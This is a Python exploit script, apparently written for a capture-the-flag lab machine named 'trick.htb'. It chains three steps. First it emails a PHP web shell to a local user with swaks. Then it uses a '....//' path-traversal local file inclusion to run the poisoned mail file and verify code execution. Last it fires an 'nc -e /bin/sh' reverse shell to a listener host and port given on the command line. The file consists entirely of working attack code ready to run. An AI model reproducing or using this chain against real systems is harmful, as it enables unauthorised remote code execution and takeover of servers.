import subprocess
import traceback
import requests
import argparse

def send_payload():
    command = [
        "swaks",
        "--to", "michael",
        "--from", "hacker",
        "--header", "Subject: Testing!",
        "--body", "<?php system($_REQUEST[\"cmd\"]); ?>",
        "--server", "10.10.11.166"
    ]

    try:
        result = subprocess.run(command, capture_output=True, text=True, check=True)
        print("[+] Payload sent successfully.")
        print("Output:\n", result.stdout)
        return True
    except subprocess.CalledProcessError as e:
        print("[-] Error sending payload:")
        print(e.stderr)
        traceback.print_exc()
        return False

def revShell(lhost,lport):
    vrfyExcUrl = "http://preprod-marketing.trick.htb:80/index.php?page=....//....//....//....//var/mail/michael&cmd=id"
    print("[*] Verifying the code execution...")
    try:
        vrfyExc = requests.get(vrfyExcUrl)
        if "uid=1001(michael) gid=1001(michael) groups=1001(michael),1002(security)" in vrfyExc.text:
            print("[+] Code Execution verified successfully, response:\n", vrfyExc.text)
            try:
                url = f"http://preprod-marketing.trick.htb:80/index.php?page=....//....//....//....//var/mail/michael&cmd=/bin/bash%20-c%20%27/usr/bin/nc%20-e%20/bin/sh%20{lhost}%20{lport}%27"
                print("[+] Reverse Shell triggered. Please check you listener!")
                print("[+] Reverse Shell url: ", url)
                requests.get(url)
            except Exception as e:
                print("[-] Error triggerring the Reverse Shell: ", e)
                traceback.print_exc()
        else:
            print("[-] An error occured executing code on the target machine")
            print("[*] Response returned from the web server: ", vrfyExc.text)
    except Exception as e:
        print("[-] Failed to verify the code execution: ", e)
        traceback.print_exc()


def main():
    parser = argparse.ArgumentParser(description="Get a reverse shell")
    parser.add_argument("lhost", help="Listener IP address")
    parser.add_argument("lport", help="Listener port")
    args = parser.parse_args()
    if send_payload():
        revShell(args.lhost, args.lport)

if __name__ == "__main__":
    main()
